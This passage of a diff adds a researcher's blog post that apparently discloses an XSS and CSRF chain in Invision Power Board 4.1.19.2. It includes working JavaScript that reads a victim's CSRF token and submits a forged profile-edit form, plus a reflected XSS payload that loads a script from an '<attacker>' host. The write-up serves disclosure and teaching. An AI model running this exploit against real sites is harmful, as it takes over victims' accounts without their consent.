+  <span class="kd">var</span> <span class="nx">profile</span> <span class="o">=</span> <span class="nx">yay</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">yay1</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">"profile"</span><span class="p">)){</span>
+  <span class="c1">//user = normal user acc.</span>
+  <span class="kd">var</span> <span class="nx">profile</span> <span class="o">=</span> <span class="nx">yay1</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">yay2</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">"profile"</span><span class="p">)){</span>
+  <span class="c1">//user = normal user acc.</span>
+  <span class="kd">var</span> <span class="nx">profile</span> <span class="o">=</span> <span class="nx">yay2</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">yay3</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">"profile"</span><span class="p">)){</span>
+  <span class="c1">//user = normal user acc.</span>
+  <span class="kd">var</span> <span class="nx">profile</span> <span class="o">=</span> <span class="nx">yay3</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">yay4</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">"profile"</span><span class="p">)){</span>
+  <span class="c1">//user = normal user acc.</span>
+  <span class="kd">var</span> <span class="nx">profile</span> <span class="o">=</span> <span class="nx">yay4</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">yay5</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">"profile"</span><span class="p">)){</span>
+  <span class="c1">//user = normal user acc.</span>
+  <span class="kd">var</span> <span class="nx">profile</span> <span class="o">=</span> <span class="nx">yay5</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">yay6</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">"profile"</span><span class="p">)){</span>
+  <span class="c1">//user = normal user acc.</span>
+  <span class="kd">var</span> <span class="nx">profile</span> <span class="o">=</span> <span class="nx">yay6</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">yay7</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">"profile"</span><span class="p">)){</span>
+  <span class="c1">//user = normal user acc.</span>
+  <span class="kd">var</span> <span class="nx">profile</span> <span class="o">=</span> <span class="nx">yay7</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">check0</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">"profile"</span><span class="p">)){</span>
+  <span class="c1">//user = mod or admin</span>
+  <span class="kd">var</span> <span class="nx">profile</span> <span class="o">=</span> <span class="nx">check0</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">check2</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">"profile"</span><span class="p">)){</span>
+  <span class="c1">//user = mod or admin</span>
+  <span class="kd">var</span> <span class="nx">profile</span> <span class="o">=</span> <span class="nx">check2</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">check3</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">"profile"</span><span class="p">)){</span>
+  <span class="c1">//user = mod or admin</span>
+  <span class="kd">var</span> <span class="nx">profile</span> <span class="o">=</span> <span class="nx">check3</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">check4</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">"profile"</span><span class="p">)){</span>
+  <span class="c1">//user = mod or admin</span>
+  <span class="kd">var</span> <span class="nx">profile</span> <span class="o">=</span> <span class="nx">check4</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">check5</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">"profile"</span><span class="p">)){</span>
+  <span class="c1">//user = mod or admin</span>
+  <span class="kd">var</span> <span class="nx">profile</span> <span class="o">=</span> <span class="nx">check5</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">check6</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">"profile"</span><span class="p">)){</span>
+  <span class="c1">//user = mod or admin</span>
+  <span class="kd">var</span> <span class="nx">profile</span> <span class="o">=</span> <span class="nx">check6</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="kd">var</span> <span class="kr">final</span> <span class="o">=</span> <span class="nx">profile</span> <span class="o">+</span> <span class="s1">'edit/'</span><span class="p">;</span>
+
+<span class="c1">// steals the csrf token</span>
+
+<span class="kd">var</span> <span class="nx">csrf</span> <span class="o">=</span> <span class="kd">get</span><span class="p">(</span><span class="kr">final</span><span class="p">);</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">csrf</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">inp</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'input'</span><span class="p">)[</span><span class="mi">3</span><span class="p">];</span>
+<span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">inp</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
+
+<span class="c1">// build form with valid token and evil credentials</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span>
+<span class="o">+=</span> <span class="s1">'&lt;form id="woot" action='</span> <span class="o">+</span> <span class="kr">final</span> <span class="o">+</span> <span class="s1">' method="POST"&gt;'</span>
+<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="form_submitted" value="1"&gt;'</span>
+<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="csrfKey" value="'</span> <span class="o">+</span> <span class="nx">token</span> <span class="o">+</span> <span class="s1">'"&gt;'</span>
+<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="MAX_FILE_SIZE" value="2097152"&gt;'</span>
+<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="plupload" value="sxcurity"&gt;'</span>
+<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="bday[month]" value="0"&gt;'</span>
+<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="bday[day]" value="0"&gt;'</span>
+<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="bday[year]" value="0"&gt;'</span>
+<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="enable_status_updates" value="0"&gt;'</span>
+<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="enable_status_updates_checkbox" value="1"&gt;'</span>
+<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="core_pfield_1" value="'</span> <span class="o">+</span> <span class="nx">payload</span> <span class="o">+</span> <span class="s1">'"&gt;'</span>
+<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="core_pfield_1_upload" value="sxcurity"&gt;'</span>
+<span class="o">+</span> <span class="s1">'&lt;/form&gt;'</span><span class="p">;</span>
+
+<span class="c1">// submits our csrf form!</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="s2">"woot"</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
+
+<span class="kd">function</span> <span class="kd">get</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">xmlHttp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+    <span class="nx">xmlHttp</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">"GET"</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+    <span class="nx">xmlHttp</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nx">xmlHttp</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>This javascript steals the victim’s CSRF token, builds a CSRF form &amp; submits it, enables the user’s status updates in order to change their “About Me” bio to “sxcurity is my hero” (shout out to Samy Kamkar for the inspiration!)<br /><br />
+Payload:  <code class="highlighter-rouge">controller='};&lt;/script&gt;&lt;script src=//&lt;attacker&gt;/lol.js&gt;&lt;/script&gt;;{'</code><br />
+<br /><br />
+Needless to say, I had a ton of fun weaponizing this reflected XSS and abusing the HTML option in the Announcements! It was definitely a great learning experience as well. Read the full advisory <a href="https://packetstormsecurity.com/files/142937/Invision-Power-Board-4.1.19.2-XSS-CSRF-File-Upload-Disclosure.html" style="color:#E22A3C">here</a>.
+<br /><br />
+Thanks for reading,<br /><br />
+<strong>Corben Douglas</strong> (<font color="#E22A3C">@sxcurity</font>)</p>
+<ul>
+  <li>https://hackerone.com/cdl</li>
+  <li>https://twitter.com/sxcurity</li>
+  <li>https://bugcrowd.com/c</li>
+  <li>https://github.com/sxcurity</li>
+</ul>
+
+
+  </div>
+
+  
+    <div class="post-comments" itemprop="comment">
+      <hr />
+<h1>Comments</h1>
+<div id="disqus_thread"></div>
+<script>
+    /**
+     *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+     */
+    
+  /* var disqus_config = function () {
+     this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+     this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    */
+    (function() {  // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        
+        s.src = 'https://sxcurity.disqus.com/embed.js';
+        
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+    </div>
+  
+
+</article>
+
+      </div>
+    </main>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <p>
+      
+
+&copy; Corben Douglas - Twitter: <a href="https://twitter.com/sxcurity">@sxcurity</a> - Subscribe via <a href="http://hack-r.be:4000/feed.xml">RSS</a>
+
+    </p>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
